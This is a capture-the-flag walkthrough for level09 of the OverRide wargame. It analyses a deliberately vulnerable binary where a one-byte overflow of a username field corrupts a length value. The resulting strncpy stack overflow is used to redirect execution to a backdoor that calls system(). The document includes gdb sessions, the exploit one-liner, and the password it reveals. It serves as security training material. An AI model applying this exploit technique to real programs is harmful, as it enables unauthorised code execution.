# OverRide — Level09 Walkthrough

## Binary Analysis

The program stores user input inside this structure:

```c
typedef struct s_message
{
    char text[140];
    char username[40];
    int len;
} t_message;
```

Important functions:

- `set_username()` copies the username into `message->username`
- `set_msg()` copies message data into `message->text` using `message->len`
- `secret_backdoor()` executes a command with `system()`

Decompiled code:

```c
void secret_backdoor() {
    char buffer[128];

    fgets(buffer, 128, stdin);
    system(buffer);
}

void set_msg(t_message *message) {
    char local_buffer[0x400]; // 1024

    memset(local_buffer, '\0', 0x400); // 128

    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(local_buffer, 0x400, stdin);
    strncpy(message->text, local_buffer, message->len); // 0x8c ; 140
}

void set_username(t_message *message) {
    int32_t i;
    char local_buffer[0x80]; // 128
    
    memset(local_buffer, 0, 0x80); // 128

    puts(">: Enter your username");
    printf(">>: ");
    fgets(local_buffer, 0x80, stdin); // 128

    *(int32_t *)(local_buffer + 140) = 0;

    for (i = 0; i <= 0x28 && local_buffer[i]; i++) {
        message->username[i] = local_buffer[i];
    }

    printf(">: Welcome, %s", message->username);
}

void handle_msg() {
    t_message message;

    memset(message.username, 0, 0x28); // 40
    message.len = 0x8c; // 140

    set_username(&message);
    set_msg(&message);

    puts(">: Msg sent!");
}

int main() {
    puts("--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------");
    handle_msg();
    return 0;
}
```

## Vulnerability

In `set_username()`, the loop copies up to **41 bytes** (`i <= 0x28`) into a 40-byte field (`username[40]`).

That 1-byte overflow reaches the first byte of `message->len`, which is later used by `strncpy()` in `set_msg()`.

By corrupting `len` (for example with `0xff`), `strncpy()` copies much more than 140 bytes into `message->text`, causing a stack overflow and control of `RIP`.

## Finding the RIP Offset

Run with a crafted username (to increase `len`) and a cyclic pattern as message:

```bash
(gdb) r < <(python -c 'print "a" * 40 + "\xff"'; cat)
```

Crash result:

```bash
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5c8:
 rip = 0x555555554931 in handle_msg; saved rip 0x4138674137674136
```

From the cyclic value in saved `RIP`, the offset is **200 bytes**.

## Resolve `secret_backdoor()` Address (PIE)

Because PIE is enabled, resolve the function address at runtime:

```bash
level09@OverRide:~$ gdb ./level09
(gdb) b main
(gdb) r
Starting program: /home/users/level09/level09
Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info function
...
0x000055555555488c  secret_backdoor
...
```

So runtime `secret_backdoor` address is `0x000055555555488c`.

## Exploit Payload

1. Username payload: 40 `'a'` + `"\xff"` (corrupt `len`)
2. Message payload:
   - 200 bytes padding
   - overwrite `RIP` with `secret_backdoor`
   - command string for backdoor (e.g. `/bin/sh`)

```bash
level09@OverRide:~$ (python -c 'print "a" * 40 + "\xff"'; python -c 'print "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

## Result

Successfully redirected execution to `secret_backdoor()` and retrieved the final password:

`j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
